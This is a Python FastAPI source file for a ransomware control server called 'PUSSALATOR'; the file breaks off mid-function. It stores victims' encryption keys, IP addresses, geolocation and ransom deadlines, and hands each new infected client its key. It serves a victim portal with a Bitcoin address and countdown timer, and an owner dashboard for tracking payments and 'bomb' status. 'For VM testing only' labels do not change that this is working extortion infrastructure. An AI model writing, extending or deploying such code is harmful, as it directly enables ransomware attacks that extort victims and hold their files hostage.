import os
import json
import random
import string
import hashlib
import sqlite3
from datetime import datetime, timedelta
from contextlib import asynccontextmanager
from typing import Optional, Dict, Any, List

# FastAPI imports
from fastapi import FastAPI, Request, Response, HTTPException, Depends
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

# Third party imports
from pydantic import BaseModel

# ============================================================================
# CONFIGURATION
# ============================================================================

class Config:
    SECRET_KEY = os.environ.get('SECRET_KEY', 'dev-key-change-this')
    
    # Ransom settings
    DEFAULT_RANSOM_AMOUNT = os.environ.get('DEFAULT_RANSOM_AMOUNT', '0.5 BTC')
    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS')
    DEFAULT_DEADLINE_HOURS = int(os.environ.get('DEFAULT_DEADLINE_HOURS', 72))
    
    # Owner credentials
    OWNER_ID = os.environ.get('OWNER_ID')
    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
    
    # Server settings
    DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'
    HOST = '0.0.0.0'
    PORT = int(os.environ.get('PORT', 8000))
    
    # Database
    DATABASE = 'pussalator.db'

# ============================================================================
# DATABASE SETUP
# ============================================================================

def init_db():
    """Initialize SQLite database"""
    conn = sqlite3.connect(Config.DATABASE)
    c = conn.cursor()
    
    # Create victims table
    c.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY,
            key TEXT NOT NULL,
            deadline TEXT NOT NULL,
            created TEXT NOT NULL,
            status TEXT DEFAULT 'unpaid',
            files INTEGER DEFAULT 0,
            ransom TEXT DEFAULT '0.5 BTC',
            wallet TEXT DEFAULT '1PussWalletVMTest',
            hostname TEXT,
            ip TEXT,
            country TEXT,
            country_code TEXT,
            city TEXT,
            lat REAL DEFAULT 0,
            lon REAL DEFAULT 0,
            isp TEXT,
            os TEXT,
            bomb_status TEXT DEFAULT 'inactive',
            bomb_size REAL DEFAULT 0,
            paid_at TEXT,
            tx TEXT,
            last_seen TEXT,
            notes TEXT
        )
    ''')
    
    # Create bomb_commands table
    c.execute('''
        CREATE TABLE IF NOT EXISTS bomb_commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT NOT NULL,
            action TEXT NOT NULL,
            filename TEXT,
            issued_at TEXT DEFAULT CURRENT_TIMESTAMP,
            executed INTEGER DEFAULT 0
        )
    ''')
    
    # Create logs table
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            action TEXT NOT NULL,
            details TEXT,
            ip TEXT,
            timestamp TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()
    print("[+] Database initialized")

# Initialize DB on startup
init_db()

# ============================================================================
# DATABASE FUNCTIONS
# ============================================================================

def db_execute(query, params=()):
    """Execute database query"""
    conn = sqlite3.connect(Config.DATABASE)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute(query, params)
    conn.commit()
    result = c.fetchall()
    conn.close()
    return [dict(row) for row in result]

def db_get_one(query, params=()):
    """Get one row from database"""
    conn = sqlite3.connect(Config.DATABASE)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute(query, params)
    row = c.fetchone()
    conn.close()
    return dict(row) if row else None

def db_insert(table, data):
    """Insert into database"""
    keys = ', '.join(data.keys())
    placeholders = ', '.join(['?' for _ in data])
    values = list(data.values())
    
    query = f"INSERT INTO {table} ({keys}) VALUES ({placeholders})"
    db_execute(query, values)

def db_update(table, data, where, where_params):
    """Update database"""
    set_clause = ', '.join([f"{k}=?" for k in data.keys()])
    values = list(data.values()) + where_params
    
    query = f"UPDATE {table} SET {set_clause} WHERE {where}"
    db_execute(query, values)

# ============================================================================
# PYDANTIC MODELS
# ============================================================================

class VictimRegister(BaseModel):
    victim_id: Optional[str] = None
    hostname: Optional[str] = "Unknown"
    ip: Optional[str] = "0.0.0.0"
    country: Optional[str] = "Unknown"
    country_code: Optional[str] = "XX"
    city: Optional[str] = "Unknown"
    lat: Optional[float] = 0.0
    lon: Optional[float] = 0.0
    isp: Optional[str] = "Unknown"
    os: Optional[str] = "Unknown"
    files: Optional[int] = 0

class VictimUpdate(BaseModel):
    victim_id: str
    files_encrypted: Optional[int] = None

class PaymentVerify(BaseModel):
    victim_id: str
    tx_id: Optional[str] = "manual_verification"

class BombUpdate(BaseModel):
    client_id: str
    size_gb: Optional[float] = 0
    error: Optional[str] = None

class OwnerLogin(BaseModel):
    owner_id: str
    password: str

class BombControl(BaseModel):
    victim_id: str
    filename: Optional[str] = "explosion.dat"

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def generate_victim_id() -> str:
    """Generate random victim ID"""
    chars = string.ascii_uppercase + string.digits
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    random_part = ''.join(random.choices(chars, k=8))
    return f"{timestamp}-{random_part}"

def generate_encryption_key() -> str:
    """Generate encryption key"""
    from cryptography.fernet import Fernet
    return Fernet.generate_key().decode()

def log_action(action: str, details: str, ip: str = None):
    """Log system action"""
    try:
        db_insert('logs', {
            'action': action,
            'details': details,
            'ip': ip or 'unknown',
            'timestamp': datetime.utcnow().isoformat()
        })
    except:
        pass

def get_stats() -> Dict[str, Any]:
    """Get system statistics"""
    try:
        victims = db_execute('SELECT * FROM victims')
        
        total = len(victims)
        paid = len([v for v in victims if v['status'] == 'paid'])
        unpaid = len([v for v in victims if v['status'] == 'unpaid'])
        expired = len([v for v in victims if v['status'] == 'expired'])
        total_files = sum(v.get('files', 0) for v in victims)
        active_bombs = len([v for v in victims if v['bomb_status'] == 'active'])
        
        today = datetime.now().date().isoformat()
        paid_today = len([v for v in victims if v['status'] == 'paid' and v.get('paid_at', '').startswith(today)])
        
        return {
            'total': total,
            'paid': paid,
            'unpaid': unpaid,
            'expired': expired,
            'total_files': total_files,
            'active_bombs': active_bombs,
            'paid_today': paid_today
        }
    except Exception as e:
        print(f"Stats error: {e}")
        return {
            'total': 0, 'paid': 0, 'unpaid': 0, 'expired': 0,
            'total_files': 0, 'active_bombs': 0, 'paid_today': 0
        }

# ============================================================================
# FASTAPI APP INIT
# ============================================================================

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    print("=" * 60)
    print("PUSSALATOR - FIXED BACKEND")
    print("=" * 60)
    print(f"Server: http://{Config.HOST}:{Config.PORT}")
    print(f"Owner ID: {Config.OWNER_ID}")
    print("=" * 60)
    print("WARNING: For VM testing only!")
    print("=" * 60)
    
    yield
    
    print("[+] Shutting down...")

app = FastAPI(
    title="PUSSALATOR",
    description="For VM testing only",
    version="1.0",
    lifespan=lifespan
)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ============================================================================
# HTML TEMPLATES
# ============================================================================

LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>PUSSALATOR</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 10px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 600px;
            width: 100%;
            margin: 20px auto;
            border: 2px solid #ff0000;
            padding: 30px 20px;
            background: #000000;
            box-shadow: 0 0 20px #ff0000;
            text-align: center;
        }
        h1 {
            font-size: 42px;
            color: #ff0000;
            text-shadow: 0 0 10px #ff0000;
            margin: 10px 0;
            animation: flicker 3s infinite;
        }
        @media (max-width: 480px) { h1 { font-size: 32px; } }
        @keyframes flicker {
            0% { opacity: 1; }
            50% { opacity: 0.9; }
            51% { opacity: 1; }
            60% { opacity: 0.95; }
            100% { opacity: 1; }
        }
        .subtitle {
            color: #ff6666;
            margin-bottom: 25px;
            font-size: 16px;
            border-bottom: 1px dashed #ff0000;
            padding-bottom: 15px;
        }
        .ascii {
            color: #ff0000;
            font-size: 10px;
            line-height: 1.2;
            white-space: pre;
            margin: 15px 0;
            overflow-x: auto;
        }
        .input-group { margin: 25px 0; }
        .input-field {
            background: #111;
            border: 2px solid #ff0000;
            color: #00ff00;
            padding: 12px 15px;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            width: 100%;
            max-width: 300px;
            margin: 10px auto;
            display: block;
            text-align: center;
        }
        .input-field:focus {
            outline: none;
            border-color: #00ff00;
            box-shadow: 0 0 15px #ff0000;
        }
        .button {
            background: #ff0000;
            color: black;
            border: none;
            padding: 12px 30px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin: 10px;
            transition: 0.3s;
            border-radius: 3px;
        }
        .button:hover {
            background: #ff3333;
            box-shadow: 0 0 15px #ff0000;
            transform: scale(1.02);
        }
        .stats {
            color: #ff6666;
            margin-top: 25px;
            font-size: 13px;
            padding: 15px;
            background: #111;
            border: 1px solid #330000;
            border-radius: 5px;
        }
        .message {
            color: #ff6666;
            margin-top: 15px;
            min-height: 25px;
            font-size: 14px;
        }
        .footer {
            margin-top: 20px;
            font-size: 10px;
            color: #333;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 15px;
        }
        .stat-item {
            background: #1a0000;
            padding: 8px;
            border-radius: 3px;
        }
        .stat-label {
            font-size: 11px;
            color: #ff9999;
        }
        .stat-number {
            font-size: 18px;
            color: #ff0000;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="ascii">
    /\\____/\\    
   (  o  o  )   
   (   ==   )   
    (______)    
        </div>
        
        <h1>PUSSALATOR</h1>
        <div class="subtitle">> ENTER ACCESS ID <</div>
        
        <div class="input-group">
            <input type="text" id="access_id" class="input-field" placeholder="ENTER ID" autocomplete="off" onkeypress="handleKey(event)">
            <button class="button" onclick="submitId()">SUBMIT</button>
        </div>
        
        <div id="message" class="message"></div>
        
        <div class="stats" id="stats">
            <div>Loading system data...</div>
        </div>
        
        <div class="footer">
            SYSTEM v1.0 | FOR VM TESTING ONLY
        </div>
    </div>

    <script>
        const OWNER_ID = '40671Mps19*';
        
        function handleKey(e) {
            if (e.key === 'Enter') {
                submitId();
            }
        }
        
        async function submitId() {
            const id = document.getElementById('access_id').value.trim();
            const messageDiv = document.getElementById('message');
            
            if (!id) {
                messageDiv.innerHTML = 'Please enter an ID';
                return;
            }
            
            // Check if it's the owner ID
            if (id === OWNER_ID) {
                const password = prompt('Enter owner password:');
                if (!password) return;
                
                try {
                    const response = await fetch('/api/owner/login', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({owner_id: id, password: password})
                    });
                    
                    const data = await response.json();
                    if (data.success) {
                        window.location.href = '/owner/dashboard';
                    } else {
                        messageDiv.innerHTML = 'Invalid password';
                    }
                } catch(e) {
                    messageDiv.innerHTML = 'Connection error';
                }
                return;
            }
            
            // Check if it's a victim ID
            try {
                const response = await fetch(`/api/victim/${id}`);
                if (response.status === 200) {
                    window.location.href = `/victim/${id}`;
                } else {
                    messageDiv.innerHTML = 'Invalid ID';
                    document.getElementById('access_id').value = '';
                }
            } catch(e) {
                messageDiv.innerHTML = 'Connection error';
            }
        }
        
        async function loadStats() {
            try {
                const response = await fetch('/api/stats');
                const stats = await response.json();
                
                document.getElementById('stats').innerHTML = `
                    <div class="stats-grid">
                        <div class="stat-item">
                            <div class="stat-label">TOTAL</div>
                            <div class="stat-number">${stats.total}</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label">PAID</div>
                            <div class="stat-number">${stats.paid}</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label">ACTIVE</div>
                            <div class="stat-number">${stats.active_bombs || 0}</div>
                        </div>
                    </div>
                    <div style="margin-top: 10px; font-size: 11px;">
                        Files encrypted: ${(stats.total_files || 0).toLocaleString()}
                    </div>
                `;
            } catch(e) {
                document.getElementById('stats').innerHTML = 'System data unavailable';
            }
        }
        
        loadStats();
        setInterval(loadStats, 10000);
    </script>
</body>
</html>
"""

VICTIM_PAGE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Victim Status - PUSSALATOR</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 15px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 700px;
            width: 100%;
            margin: 20px auto;
            border: 2px solid #ff0000;
            padding: 25px 20px;
            background: #000000;
            box-shadow: 0 0 20px #ff0000;
        }
        h1 {
            color: #ff0000;
            text-align: center;
            font-size: 32px;
            margin: 5px 0 20px;
            text-shadow: 0 0 8px #ff0000;
        }
        @media (max-width: 480px) { h1 { font-size: 24px; } }
        .info-box {
            background: #111;
            border: 1px solid #330000;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            font-size: 14px;
            line-height: 1.6;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            border-bottom: 1px solid #222;
        }
        .info-label {
            color: #ff9999;
            font-weight: bold;
        }
        .info-value {
            color: #00ff00;
            word-break: break-word;
            text-align: right;
        }
        .key-box {
            background: #003300;
            border: 2px solid #00ff00;
            padding: 20px;
            margin: 20px 0;
            word-break: break-all;
            font-family: monospace;
            font-size: 14px;
            border-radius: 5px;
            color: #00ff00;
        }
        .status-box {
            text-align: center;
            padding: 20px;
            margin: 15px 0;
            border-radius: 5px;
            font-size: 24px;
            font-weight: bold;
        }
        .status-paid {
            background: #003300;
            color: #00ff00;
            border: 2px solid #00ff00;
        }
        .status-unpaid {
            background: #333300;
            color: #ffff00;
            border: 2px solid #ffff00;
        }
        .status-expired {
            background: #330000;
            color: #ff6666;
            border: 2px solid #ff6666;
        }
        .timer {
            font-size: 36px;
            text-align: center;
            color: #ff0000;
            margin: 20px 0;
            padding: 15px;
            background: #1a0000;
            border-radius: 5px;
            font-weight: bold;
        }
        @media (max-width: 480px) { .timer { font-size: 28px; } }
        .button {
            background: #ff0000;
            color: black;
            border: none;
            padding: 12px 25px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            margin: 10px 5px;
            border-radius: 3px;
            transition: 0.3s;
        }
        .button:hover {
            background: #ff3333;
            box-shadow: 0 0 15px #ff0000;
        }
        .button-small { padding: 8px 15px; font-size: 12px; }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #ff6666;
            text-decoration: none;
            font-size: 14px;
            padding: 8px 15px;
            border: 1px solid #ff6666;
            border-radius: 3px;
        }
        .back-link:hover {
            background: #ff0000;
            color: black;
            border-color: #ff0000;
        }
        .btc-address {
            background: #222;
            padding: 10px;
            font-family: monospace;
            font-size: 14px;
            color: #ffaa00;
            word-break: break-all;
            border-radius: 3px;
            margin: 10px 0;
        }
        .copy-btn {
            background: #333;
            color: #ff6666;
            border: 1px solid #ff6666;
            padding: 5px 10px;
            font-size: 12px;
            cursor: pointer;
            border-radius: 3px;
        }
        .copy-btn:hover {
            background: #ff0000;
            color: black;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 VICTIM PORTAL</h1>
        <div id="content" style="min-height: 200px;">Loading...</div>
        <div style="text-align: center;">
            <a href="/" class="back-link">← BACK TO LOGIN</a>
        </div>
    </div>

    <script>
        const VICTIM_ID = '{{ victim_id }}';
        
        async function loadStatus() {
            try {
                const response = await fetch(`/api/victim/${VICTIM_ID}`);
                if (!response.ok) throw new Error('Victim not found');
                const v = await response.json();
                
                let html = '<div class="info-box">';
                html += `
                    <div class="info-row"><span class="info-label">Victim ID:</span><span class="info-value">${v.id}</span></div>
                    <div class="info-row"><span class="info-label">Hostname:</span><span class="info-value">${v.hostname || 'Unknown'}</span></div>
                    <div class="info-row"><span class="info-label">IP Address:</span><span class="info-value">${v.ip || '0.0.0.0'}</span></div>
                    <div class="info-row"><span class="info-label">Location:</span><span class="info-value">${v.city || 'Unknown'}, ${v.country || 'Unknown'}</span></div>
                    <div class="info-row"><span class="info-label">Files Encrypted:</span><span class="info-value">${(v.files || 0).toLocaleString()}</span></div>
                    <div class="info-row" style="margin-top:10px;border-top:2px solid #ff0000;padding-top:10px;">
                        <span class="info-label">Ransom:</span><span class="info-value" style="color:#ffaa00;">${v.ransom || '0.5 BTC'}</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">BTC Address:</span><span class="info-value" style="font-size:12px;">${v.wallet || '1PussWalletVMTest'}</span>
                    </div>
                </div>`;
                
                if (v.status === 'paid') {
                    html += `<div class="status-box status-paid">✓ PAID ✓</div>`;
                    if (v.key) {
                        html += `<div class="key-box"><strong>🔑 KEY:</strong><br>${v.key}</div>`;
                        html += `<div style="text-align:center;"><button class="button button-small" onclick="copyKey('${v.key}')">📋 COPY</button></div>`;
                    }
                } else if (v.status === 'expired') {
                    html += `<div class="status-box status-expired">✗ EXPIRED ✗</div>`;
                } else {
                    html += `<div class="status-box status-unpaid">⏳ UNPAID ⏳</div>`;
                    html += `<div class="btc-address" id="btcAddress">${v.wallet || '1PussWalletVMTest'}</div>`;
                    html += `<div style="text-align:center;"><button class="copy-btn" onclick="copyBtc()">📋 COPY BTC</button></div>`;
                    html += `<div class="timer" id="timer">Loading...</div>`;
                }
                
                document.getElementById('content').innerHTML = html;
                
                if (v.status === 'unpaid' && v.deadline) updateTimer(v.deadline);
                
            } catch(e) {
                document.getElementById('content').innerHTML = `<div style="color:#ff0000;padding:40px;text-align:center;">Error loading data</div>`;
            }
        }
        
        function updateTimer(deadlineStr) {
            const deadline = new Date(deadlineStr).getTime();
            function tick() {
                const diff = deadline - new Date().getTime();
                if (diff <= 0) {
                    document.getElementById('timer').innerHTML = '⏰ EXPIRED ⏰';
                    setTimeout(() => location.reload(), 2000);
                    return;
                }
                const h = Math.floor(diff/(1000*60*60));
                const m = Math.floor((diff%(1000*60*60))/(1000*60));
                const s = Math.floor((diff%(1000*60))/1000);
                document.getElementById('timer').innerHTML = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
            }
            tick();
            setInterval(tick, 1000);
        }
        
        function copyKey(k) { navigator.clipboard.writeText(k).then(() => alert('✓ Key copied')); }
        function copyBtc() { 
            navigator.clipboard.writeText(document.getElementById('btcAddress').innerText).then(() => alert('✓ BTC address copied')); 
        }
        
        loadStatus();
        setInterval(loadStatus, 30000);
    </script>
</body>
</html>
"""

OWNER_DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Owner Dashboard - PUSSALATOR</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 15px;
        }
        .navbar {
            background: #1a0000;
            padding: 15px;
            border-bottom: 2px solid #ff0000;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .navbar h1 {
            color: #ff0000;
            margin: 0;
            font-size: 28px;
        }
        .nav-links button {
            background: #ff0000;
            color: black;
            border: none;
            padding: 8px 15px;
            margin-left: 10px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
        }
        .nav-links button:hover {
            background: #ff6666;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }
        .stat-card {
            background: #1a0000;
            border: 1px solid #ff0000;
            padding: 15px;
            text-align: center;
        }
        .stat-value {
            font-size: 28px;
            color: #ff0000;
            font-weight: bold;
        }
        .stat-label {
            font-size: 12px;
            color: #ff9999;
        }
        .table-container {
            overflow-x: auto;
            background: #1a0000;
            border: 1px solid #ff0000;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 800px;
        }
        th {
            background: #330000;
            color: #ff0000;
            padding: 12px;
            text-align: left;
        }
        td {
            padding: 10px 12px;
            border-bottom: 1px solid #330000;
        }
        tr:hover {
            background: #330000;
        }
        .status-paid { color: #00ff00; }
        .status-unpaid { color: #ffff00; }
        .status-expired { color: #ff6666; }
        .bomb-active {
            color: #ff0000;
            animation: blink 1s infinite;
            font-weight: bold;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
        .action-btn {
            background: #333;
            color: #ff6666;
            border: 1px solid #ff0000;
            padding: 4px 8px;
            margin: 2px;
            cursor: pointer;
            font-size: 11px;
        }
        .action-btn:hover {
            background: #ff0000;
            color: black;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal.show { display: flex; }
        .modal-content {
            background: #1a0000;
            border: 2px solid #ff0000;
            padding: 25px;
            max-width: 600px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
        }
        .close {
            color: #ff6666;
            font-size: 28px;
            cursor: pointer;
            float: right;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <h1>⚙️ OWNER DASHBOARD</h1>
        <div class="nav-links">
            <button onclick="loadData()">🔄 REFRESH</button>
            <button onclick="logout()">🚪 LOGOUT</button>
        </div>
    </div>
    
    <div class="stats-grid" id="statsGrid">
        <div class="stat-card"><div class="stat-value" id="totalVictims">0</div><div class="stat-label">TOTAL</div></div>
        <div class="stat-card"><div class="stat-value" id="paidVictims">0</div><div class="stat-label">PAID</div></div>
        <div class="stat-card"><div class="stat-value" id="unpaidVictims">0</div><div class="stat-label">UNPAID</div></div>
        <div class="stat-card"><div class="stat-value" id="expiredVictims">0</div><div class="stat-label">EXPIRED</div></div>
        <div class="stat-card"><div class="stat-value" id="totalFiles">0</div><div class="stat-label">FILES</div></div>
        <div class="stat-card"><div class="stat-value" id="activeBombs">0</div><div class="stat-label">BOMBS</div></div>
    </div>
    
    <div class="table-container">
        <table id="victimsTable">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>HOSTNAME</th>
                    <th>IP</th>
                    <th>FILES</th>
                    <th>STATUS</th>
                    <th>BOMB</th>
                    <th>ACTIONS</th>
                </tr>
            </thead>
            <tbody id="tableBody">
                <tr><td colspan="7" style="text-align:center;padding:40px;">Loading victims...</td></tr>
            </tbody>
        </table>
    </div>
    
    <!-- Victim Modal -->
    <div class="modal" id="victimModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 style="color:#ff0000;">VICTIM DETAILS</h2>
                <span class="close" onclick="closeModal()">&times;</span>
            </div>
            <div id="victimDetails"></div>
            <div style="margin-top:20px;">
                <button class="action-btn" onclick="markPaid()">💰 MARK PAID</button>
                <button class="action-btn" onclick="deleteVictim()">❌ DELETE</button>
            </div>
        </div>
    </div>

    <script>
        let currentVictim = null;
        let victims = [];
        
        async function loadData() {
            await loadStats();
            await loadVictims();
        }
        
        async function loadStats() {
            try {
                const response = await fetch('/api/stats');
                const stats = await response.json();
                document.getElementById('totalVictims').textContent = stats.total || 0;
                document.getElementById('paidVictims').textContent = stats.paid || 0;
                document.getElementById('unpaidVictims').textContent = stats.unpaid || 0;
                document.getElementById('expiredVictims').textContent = stats.expired || 0;
                document.getElementById('totalFiles').textContent = (stats.total_files || 0).toLocaleString();
                document.getElementById('activeBombs').textContent = stats.active_bombs || 0;
            } catch(e) {
                console.error('Stats error:', e);
            }
        }
        
        async function loadVictims() {
            try {
                const response = await fetch('/api/owner/victims');
                victims = await response.json();
                renderTable();
            } catch(e) {
                document.getElementById('tableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;color:#ff0000;">Error loading victims</td></tr>';
            }
        }
        
        function renderTable() {
            if (!victims.length) {
                document.getElementById('tableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;">No victims found</td></tr>';
                return;
            }
            
            let html = '';
            victims.forEach(v => {
                const bombIcon = v.bomb_status === 'active' ? '💣 ACTIVE' : '⚫';
                const bombClass = v.bomb_status === 'active' ? 'bomb-active' : '';
                
                html += `<tr>
                    <td><small>${(v.id || '').substring(0, 20)}...</small></td>
                    <td>${v.hostname || 'Unknown'}</td>
                    <td>${v.ip || '0.0.0.0'}</td>
                    <td>${(v.files || 0).toLocaleString()}</td>
                    <td><span class="status-${v.status || 'unknown'}">${v.status || 'unknown'}</span></td>
                    <td class="${bombClass}">${bombIcon}<br><small>${(v.bomb_size || 0).toFixed(1)}GB</small></td>
                    <td>
                        <button class="action-btn" onclick="viewVictim('${v.id}')">VIEW</button>
                    </td>
                </tr>`;
            });
            
            document.getElementById('tableBody').innerHTML = html;
        }
        
        async function viewVictim(victimId) {
            try {
                const response = await fetch(`/api/owner/victim/${victimId}`);
                currentVictim = await response.json();
                
                let details = '';
                for (const [key, value] of Object.entries(currentVictim)) {
                    details += `<div style="padding:5px;background:#111;margin:2px 0;"><strong>${key}:</strong> ${value || 'N/A'}</div>`;
                }
                
                document.getElementById('victimDetails').innerHTML = details;
                document.getElementById('victimModal').classList.add('show');
            } catch(e) {
                alert('Error loading victim details');
            }
        }
        
        function closeModal() {
            document.getElementById('victimModal').classList.remove('show');
            currentVictim = null;
        }
        
        async function markPaid() {
            if (!currentVictim) return;
            
            try {
                const response = await fetch(`/api/owner/mark-paid/${currentVictim.id}`, {
                    method: 'POST'
                });
                
                if (response.ok) {
                    alert('Marked as paid!');
                    closeModal();
                    loadVictims();
                }
            } catch(e) {
                alert('Error marking as paid');
            }
        }
        
        async function deleteVictim() {
            if (!currentVictim) return;
            if (!confirm(`⚠️ DELETE ${currentVictim.id}?`)) return;
            
            try {
                const response = await fetch(`/api/owner/delete-victim/${currentVictim.id}`, {
                    method: 'DELETE'
                });
                
                if (response.ok) {
                    alert('Victim deleted');
                    closeModal();
                    loadVictims();
                    loadStats();
                }
            } catch(e) {
                alert('Error deleting victim');
            }
        }
        
        async function logout() {
            await fetch('/api/owner/logout', { method: 'POST' });
            window.location.href = '/';
        }
        
        loadData();
        setInterval(loadData, 30000);
    </script>
</body>
</html>
"""

# ============================================================================
# ROUTES - PUBLIC PAGES
# ============================================================================

@app.get("/", response_class=HTMLResponse)
async def login_page():
    """Main login page"""
    return HTMLResponse(content=LOGIN_PAGE)

@app.get("/victim/{victim_id}", response_class=HTMLResponse)
async def victim_page(victim_id: str):
    """Victim status page"""
    html = VICTIM_PAGE_TEMPLATE.replace('{{ victim_id }}', victim_id)
    return HTMLResponse(content=html)

@app.get("/owner/dashboard", response_class=HTMLResponse)
async def owner_dashboard():
    """Owner dashboard"""
    return HTMLResponse(content=OWNER_DASHBOARD_TEMPLATE)

# ============================================================================
# ROUTES - API (Public)
# ============================================================================

@app.get("/api/stats")
async def api_stats():
    """Public stats endpoint"""
    return get_stats()

@app.get("/api/victim/{victim_id}")
async def api_get_victim(victim_id: str):
    """Get victim details (public)"""
    try:
        victim = db_get_one('SELECT * FROM victims WHERE id = ?', (victim_id,))
        
        if not victim:
            raise HTTPException(status_code=404, detail="Victim not found")
        
        # Check deadline
        if victim['status'] == 'unpaid' and victim.get('deadline'):
            deadline = datetime.fromisoformat(victim['deadline'])
            if datetime.utcnow() > deadline:
                db_update('victims', {'status': 'expired'}, 'id = ?', [victim_id])
                victim['status'] = 'expired'
        
        # Don't send key unless paid
        if victim['status'] != 'paid':
            victim['key'] = None
        
        return victim
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"Error getting victim: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/add-victim")
async def api_add_victim(victim_data: VictimRegister):
    """Register new victim (called by client)"""
    try:
        victim_id = victim_data.victim_id or generate_victim_id()
        
        # Check if exists
        existing = db_get_one('SELECT id FROM victims WHERE id = ?', (victim_id,))
        if existing:
            raise HTTPException(status_code=400, detail="Victim exists")
        
        # Calculate deadline
        deadline = (datetime.utcnow() + timedelta(hours=Config.DEFAULT_DEADLINE_HOURS)).isoformat()
        
        # Generate key
        encryption_key = generate_encryption_key()
        
        # Prepare victim data
        victim_dict = {
            'id': victim_id,
            'key': encryption_key,
            'deadline': deadline,
            'created': datetime.utcnow().isoformat(),
            'status': 'unpaid',
            'files': victim_data.files,
            'ransom': Config.DEFAULT_RANSOM_AMOUNT,
            'wallet': Config.DEFAULT_BTC_ADDRESS,
            'hostname': victim_data.hostname,
            'ip': victim_data.ip,
            'country': victim_data.country,
            'country_code': victim_data.country_code,
            'city': victim_data.city,
            'lat': victim_data.lat,
            'lon': victim_data.lon,
            'isp': victim_data.isp,
            'os': victim_data.os,
            'bomb_status': 'inactive',
            'bomb_size': 0
        }
        
        # Insert into database
        db_insert('victims', victim_dict)
        
        # Log
        log_action('new_victim', f'New victim: {victim_id}', victim_data.ip)
        
        print(f"[+] New victim registered: {victim_id}")
        
        # Prepare response
        response = {
            'victim_id': victim_id,
            'key': encryption_key,
            'deadline': deadline,
            'ransom': Config.DEFAULT_RANSOM_AMOUNT,
            'wallet': Config.DEFAULT_BTC_ADDRESS
        }
        
        return response
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"Error adding victim: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/update-victim")
async def api_update_victim(update_data: VictimUpdate):
    """Update victim info"""
    try:
        update_dict = {
            'last_seen': datetime.utcnow().isoformat()
        }
        
        if update_data.files_encrypted is not None:
            update_dict['files'] = update_data.files_encrypted
        
        db_update('victims', update_dict, 'id = ?', [update_data.victim_id])
        
        return {'success': True}
        
    except Exception as e:
        print(f"Error updating victim: {e}")
